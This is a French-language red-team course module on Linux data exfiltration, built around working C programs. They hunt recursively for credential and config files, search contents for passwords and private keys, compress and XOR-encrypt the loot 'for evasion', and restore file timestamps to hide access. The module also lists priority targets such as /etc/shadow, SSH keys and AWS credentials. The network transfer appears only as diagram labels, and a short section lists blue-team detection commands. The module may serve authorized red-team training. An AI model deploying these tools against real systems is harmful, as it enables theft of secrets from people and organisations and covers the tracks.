# Module L28 : File Operations Linux - Exfiltration de Donnees

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maitriser les operations fichiers offensives sur Linux pour :
- Lire et exfiltrer des fichiers sensibles
- Parcourir le systeme de fichiers recursivement
- Rechercher des fichiers par patterns (credentials, configs)
- Compresser et chiffrer avant exfiltration
- Eviter la detection lors de l'acces aux fichiers

## 📚 Theorie

### C'est quoi l'Exfiltration de Donnees ?

**Exfiltration** = processus de **voler** des donnees d'un systeme cible et les **transferer** vers un systeme attaquant.

**Objectif Red Team** : Extraire informations sensibles sans etre detecte.

### Pourquoi les File Operations ?

```ascii
RECONNAISSANCE                     EXFILTRATION
═══════════════                    ═════════════

Acces initial                      Recherche fichiers
     ↓                                  ↓
Privilege escalation               Filtrage sensibles
     ↓                                  ↓
Persistence                        Compression
     ↓                                  ↓
EXPLORATION FICHIERS  ──────►      Chiffrement
                                        ↓
                                   Transfert C2
                                        ↓
                                   Mission accomplie
```

### Types de Fichiers Cibles

```ascii
┌────────────────────────────────────────────────────────┐
│           FICHIERS SENSIBLES LINUX                     │
├────────────────────────────────────────────────────────┤
│                                                        │
│  CREDENTIALS                                           │
│  ┌──────────────────────────────────────┐            │
│  │ /etc/shadow         Password hashes  │            │
│  │ /etc/passwd         User accounts     │            │
│  │ ~/.ssh/id_rsa       SSH private keys  │            │
│  │ ~/.ssh/known_hosts  SSH connections   │            │
│  │ ~/.bash_history     Command history   │            │
│  │ ~/.aws/credentials  AWS keys          │            │
│  │ ~/.docker/config    Docker registry   │            │
│  └──────────────────────────────────────┘            │
│                                                        │
│  CONFIGURATION                                         │
│  ┌──────────────────────────────────────┐            │
│  │ /etc/nginx/nginx.conf                 │            │
│  │ /etc/apache2/sites-enabled/*          │            │
│  │ /var/www/html/config.php              │            │
│  │ .env files                             │            │
│  │ database.yml, settings.py              │            │
│  └──────────────────────────────────────┘            │
│                                                        │
│  SOURCE CODE                                           │
│  ┌──────────────────────────────────────┐            │
│  │ *.py, *.php, *.js, *.go               │            │
│  │ .git/ repositories                     │            │
│  │ Makefiles, scripts                     │            │
│  └──────────────────────────────────────┘            │
│                                                        │
│  BACKUPS                                               │
│  ┌──────────────────────────────────────┐            │
│  │ *.sql, *.dump                         │            │
│  │ *.tar.gz, *.zip, *.bak                │            │
│  │ /var/backups/*                         │            │
│  └──────────────────────────────────────┘            │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### Syscalls Linux pour File Operations

```ascii
┌────────────────────────────────────────┐
│  SYSCALLS FILE I/O                     │
├────────────────────────────────────────┤
│                                        │
│  open()      Ouvrir fichier            │
│  read()      Lire donnees              │
│  write()     Ecrire donnees            │
│  close()     Fermer fichier            │
│                                        │
│  opendir()   Ouvrir repertoire         │
│  readdir()   Lire entrees              │
│  closedir()  Fermer repertoire         │
│                                        │
│  stat()      Info fichier              │
│  lstat()     Info symlink              │
│  access()    Verifier permissions      │
│                                        │
│  mmap()      Mapper en memoire         │
│  sendfile()  Transfert zero-copy       │
│                                        │
└────────────────────────────────────────┘
```

## 🔍 Visualisation

### Processus d'Exfiltration

```ascii
ETAPES EXFILTRATION
═══════════════════════════════════════════════════════

┌──────────────────────────────────────────────────────┐
│  1. DISCOVERY - Trouver fichiers interessants       │
│     ┌────────────────────────────────────┐          │
│     │  • Parcourir /home, /root, /etc    │          │
│     │  • Filtrer par extension           │          │
│     │  • Recherche patterns (password)   │          │
│     │  • Taille < limite exfiltration    │          │
│     └────────────────────────────────────┘          │
│          ↓                                           │
├──────────────────────────────────────────────────────┤
│  2. FILTERING - Selectionner cibles                  │
│     ┌────────────────────────────────────┐          │
│     │  • Verifier permissions lecture    │          │
│     │  • Exclure fichiers systeme        │          │
│     │  • Prioriser par interet           │          │
│     └────────────────────────────────────┘          │
│          ↓                                           │
├──────────────────────────────────────────────────────┤
│  3. READING - Lire contenu                           │
│     ┌────────────────────────────────────┐          │
│     │  • open() avec O_RDONLY            │          │
│     │  • read() en chunks                │          │
│     │  • Gestion erreurs                 │          │
│     └────────────────────────────────────┘          │
│          ↓                                           │
├──────────────────────────────────────────────────────┤
│  4. COMPRESSION - Reduire taille                     │
│     ┌────────────────────────────────────┐          │
│     │  • gzip, zlib, lzma                │          │
│     │  • Archive tar                     │          │
│     │  • Ratio compression ~70%          │          │
│     └────────────────────────────────────┘          │
│          ↓                                           │
├──────────────────────────────────────────────────────┤
│  5. ENCRYPTION - Proteger donnees                    │
│     ┌────────────────────────────────────┐          │
│     │  • AES-256-CBC                     │          │
│     │  • XOR simple (stealth)            │          │
│     │  • Base64 encoding                 │          │
│     └────────────────────────────────────┘          │
│          ↓                                           │
├──────────────────────────────────────────────────────┤
│  6. EXFILTRATION - Transfert                         │
│     ┌────────────────────────────────────┐          │
│     │  • HTTP POST                       │          │
│     │  • DNS exfiltration                │          │
│     │  • ICMP tunneling                  │          │
│     │  • Socket direct                   │          │
│     └────────────────────────────────────┘          │
│          ↓                                           │
│     DONNEES EXFILTREES                               │
└──────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Technique 1 : Recherche Recursive de Fichiers

**Scanner pour fichiers sensibles** :

```c
// file_hunter.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#define MAX_PATH 4096

// Patterns a rechercher
const char *sensitive_patterns[] = {
    "password", "passwd", "pwd",
    "secret", "token", "api_key",
    "private", "credential", "auth",
    ".ssh", ".aws", ".docker",
    NULL
};

// Extensions interessantes
const char *interesting_ext[] = {
    ".conf", ".config", ".cfg",
    ".key", ".pem", ".ppk",
    ".sql", ".db", ".sqlite",
    ".env", ".ini", ".yaml",
    NULL
};

int is_interesting_file(const char *filename) {
    // Verifier patterns sensibles
    for (int i = 0; sensitive_patterns[i]; i++) {
        if (strstr(filename, sensitive_patterns[i])) {
            return 1;
        }
    }

    // Verifier extensions
    for (int i = 0; interesting_ext[i]; i++) {
        if (strstr(filename, interesting_ext[i])) {
            return 1;
        }
    }

    return 0;
}

void scan_directory(const char *path, int depth) {
    if (depth > 5) return;  // Limiter profondeur

    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        // Ignorer . et ..
        if (strcmp(entry->d_name, ".") == 0 ||
            strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        char fullpath[MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (lstat(fullpath, &st) != 0) {
            continue;
        }

        // Si repertoire, recursion
        if (S_ISDIR(st.st_mode)) {
            // Eviter /proc, /sys, /dev
            if (strncmp(fullpath, "/proc", 5) == 0 ||
                strncmp(fullpath, "/sys", 4) == 0 ||
                strncmp(fullpath, "/dev", 4) == 0) {
                continue;
            }

            scan_directory(fullpath, depth + 1);
        }
        // Si fichier regulier
        else if (S_ISREG(st.st_mode)) {
            if (is_interesting_file(entry->d_name)) {
                printf("[+] Found: %s (%ld bytes)\n",
                       fullpath, st.st_size);
            }
        }
    }

    closedir(dir);
}

int main(int argc, char *argv[]) {
    const char *start_path = (argc > 1) ? argv[1] : "/home";

    printf("[*] Scanning from: %s\n", start_path);
    scan_directory(start_path, 0);

    return 0;
}
```

### Technique 2 : Lecture et Extraction

**Lire fichiers trouves** :

```c
// file_reader.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

#define BUFFER_SIZE 8192
#define MAX_FILE_SIZE (10 * 1024 * 1024)  // 10MB

typedef struct {
    char *data;
    size_t size;
} FileData;

FileData read_file(const char *path) {
    FileData result = {NULL, 0};

    // Verifier taille fichier
    struct stat st;
    if (stat(path, &st) != 0) {
        return result;
    }

    if (st.st_size > MAX_FILE_SIZE) {
        fprintf(stderr, "[-] File too large: %s\n", path);
        return result;
    }

    // Ouvrir fichier
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return result;
    }

    // Allouer buffer
    result.data = malloc(st.st_size + 1);
    if (!result.data) {
        close(fd);
        return result;
    }

    // Lire contenu
    ssize_t total = 0;
    ssize_t n;
    while (total < st.st_size) {
        n = read(fd, result.data + total, st.st_size - total);
        if (n <= 0) break;
        total += n;
    }

    close(fd);

    result.data[total] = '\0';
    result.size = total;

    printf("[+] Read %ld bytes from %s\n", total, path);
    return result;
}

// Rechercher patterns dans fichier
void search_patterns(const char *path) {
    FileData data = read_file(path);
    if (!data.data) return;

    const char *patterns[] = {
        "password=", "passwd=", "pwd=",
        "secret=", "token=", "api_key=",
        "BEGIN RSA PRIVATE KEY",
        "BEGIN OPENSSH PRIVATE KEY",
        NULL
    };

    printf("\n[*] Analyzing: %s\n", path);

    for (int i = 0; patterns[i]; i++) {
        char *found = strstr(data.data, patterns[i]);
        if (found) {
            // Afficher contexte (100 chars)
            char context[101];
            size_t offset = found - data.data;
            size_t len = (offset + 100 < data.size) ? 100 : data.size - offset;
            memcpy(context, found, len);
            context[len] = '\0';

            printf("  [!] Pattern '%s' found:\n", patterns[i]);
            printf("      %s...\n", context);
        }
    }

    free(data.data);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <file1> [file2] ...\n", argv[0]);
        return 1;
    }

    for (int i = 1; i < argc; i++) {
        search_patterns(argv[i]);
    }

    return 0;
}
```

### Technique 3 : Compression avec zlib

**Compresser avant exfiltration** :

```c
// compressor.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

// Compresser donnees
unsigned char* compress_data(const unsigned char *data, size_t size,
                              size_t *compressed_size) {
    // Buffer pour donnees compressees (taille max = taille originale)
    uLongf dest_len = compressBound(size);
    unsigned char *dest = malloc(dest_len);
    if (!dest) return NULL;

    // Compresser
    int ret = compress2(dest, &dest_len, data, size, Z_BEST_COMPRESSION);
    if (ret != Z_OK) {
        free(dest);
        return NULL;
    }

    *compressed_size = dest_len;

    float ratio = (1.0 - ((float)dest_len / size)) * 100.0;
    printf("[+] Compressed %ld -> %ld bytes (%.1f%% reduction)\n",
           size, dest_len, ratio);

    return dest;
}

// Decompresser donnees
unsigned char* decompress_data(const unsigned char *compressed,
                                size_t compressed_size,
                                size_t original_size) {
    unsigned char *dest = malloc(original_size);
    if (!dest) return NULL;

    uLongf dest_len = original_size;
    int ret = uncompress(dest, &dest_len, compressed, compressed_size);
    if (ret != Z_OK) {
        free(dest);
        return NULL;
    }

    return dest;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <input_file> <output_file>\n", argv[0]);
        return 1;
    }

    // Lire fichier
    FILE *f = fopen(argv[1], "rb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *data = malloc(size);
    fread(data, 1, size, f);
    fclose(f);

    // Compresser
    size_t compressed_size;
    unsigned char *compressed = compress_data(data, size, &compressed_size);
    if (!compressed) {
        fprintf(stderr, "[-] Compression failed\n");
        free(data);
        return 1;
    }

    // Ecrire fichier compresse
    f = fopen(argv[2], "wb");
    if (!f) {
        perror("fopen");
        free(data);
        free(compressed);
        return 1;
    }

    // Ecrire header avec taille originale
    fwrite(&size, sizeof(size_t), 1, f);
    fwrite(compressed, 1, compressed_size, f);
    fclose(f);

    printf("[+] Written to: %s\n", argv[2]);

    free(data);
    free(compressed);

    return 0;
}
```

**Compilation** :
```bash
gcc -o compressor compressor.c -lz
```

### Technique 4 : Chiffrement Simple (XOR)

**Chiffrer pour evasion** :

```c
// xor_encrypt.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Chiffrement XOR simple
void xor_encrypt(unsigned char *data, size_t size, const char *key) {
    size_t key_len = strlen(key);

    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key_len];
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <input> <output> <key>\n", argv[0]);
        return 1;
    }

    const char *key = argv[3];

    // Lire fichier
    FILE *f = fopen(argv[1], "rb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *data = malloc(size);
    fread(data, 1, size, f);
    fclose(f);

    // Chiffrer
    xor_encrypt(data, size, key);
    printf("[+] Encrypted %ld bytes\n", size);

    // Ecrire fichier chiffre
    f = fopen(argv[2], "wb");
    if (!f) {
        perror("fopen");
        free(data);
        return 1;
    }

    fwrite(data, 1, size, f);
    fclose(f);

    free(data);

    printf("[+] Written to: %s\n", argv[2]);

    return 0;
}
```

## 🎯 Application Red Team

### 1. Pipeline d'Exfiltration Complete

**Liste de fichiers prioritaires** :

```c
const char *priority_targets[] = {
    // SSH
    "/home/*/.ssh/id_rsa",
    "/home/*/.ssh/id_dsa",
    "/home/*/.ssh/id_ecdsa",
    "/home/*/.ssh/id_ed25519",
    "/root/.ssh/id_rsa",

    // AWS
    "/home/*/.aws/credentials",
    "/home/*/.aws/config",

    // Docker
    "/home/*/.docker/config.json",

    // History
    "/home/*/.bash_history",
    "/home/*/.mysql_history",
    "/root/.bash_history",

    // Configs
    "/etc/shadow",
    "/etc/passwd",
    "/etc/sudoers",

    // Web
    "/var/www/html/.env",
    "/var/www/html/config.php",
    "/var/www/html/wp-config.php",

    NULL
};
```

### 2. Evasion de Detection

**Techniques stealth** :

```c
// stealth_ops.c
#include <stdio.h>
#include <time.h>
#include <utime.h>
#include <sys/stat.h>

// Restaurer timestamps originaux
void restore_timestamps(const char *path, const struct stat *original) {
    struct utimbuf times;
    times.actime = original->st_atime;
    times.modtime = original->st_mtime;

    utime(path, &times);
}

// Lire fichier sans modifier atime
int stealth_read(const char *path) {
    struct stat st;
    stat(path, &st);

    // Lire fichier...
    FILE *f = fopen(path, "r");
    if (!f) return -1;

    // ... operations ...

    fclose(f);

    // Restaurer timestamps
    restore_timestamps(path, &st);

    return 0;
}
```

## 📝 Points cles

### A retenir absolument

1. **Syscalls File I/O**
   - open(), read(), write(), close()
   - opendir(), readdir(), closedir()
   - stat(), lstat() pour metadata

2. **Pipeline Exfiltration**
   - Discovery: Trouver fichiers
   - Filtering: Selectionner cibles
   - Compression: Reduire taille
   - Encryption: Proteger donnees
   - Transfer: Exfiltrer

3. **Fichiers Prioritaires**
   - /etc/shadow, /etc/passwd
   - ~/.ssh/id_rsa
   - ~/.aws/credentials
   - .env, config files
   - .bash_history

4. **Evasion**
   - Restaurer timestamps
   - Noms de fichiers discrets
   - Compression + chiffrement
   - Nettoyer traces

### Commandes Detection (Blue Team)

```bash
# Monitorer acces fichiers
auditctl -w /etc/shadow -p r
ausearch -f /etc/shadow

# Verifier fichiers recemment acces
find /home -type f -atime -1

# Chercher archives suspectes
find /tmp -name "*.tar.gz" -o -name "*.zip"

# Monitorer transferts reseau
tcpdump -i any -w capture.pcap

# Verifier processus suspects
lsof | grep deleted
```

## ➡️ Prochaine etape

**Module L29 : Screenshot Linux**

Maintenant que tu sais exfiltrer des fichiers, le prochain module t'apprend a capturer des screenshots via X11 et Wayland.

## 📚 Ressources

- [Linux File I/O System Calls](https://man7.org/linux/man-pages/man2/syscalls.2.html)
- [zlib Compression Library](https://www.zlib.net/)
- [Data Exfiltration Techniques](https://attack.mitre.org/tactics/TA0010/)
- [Linux Forensics](https://www.sans.org/blog/linux-forensics/)
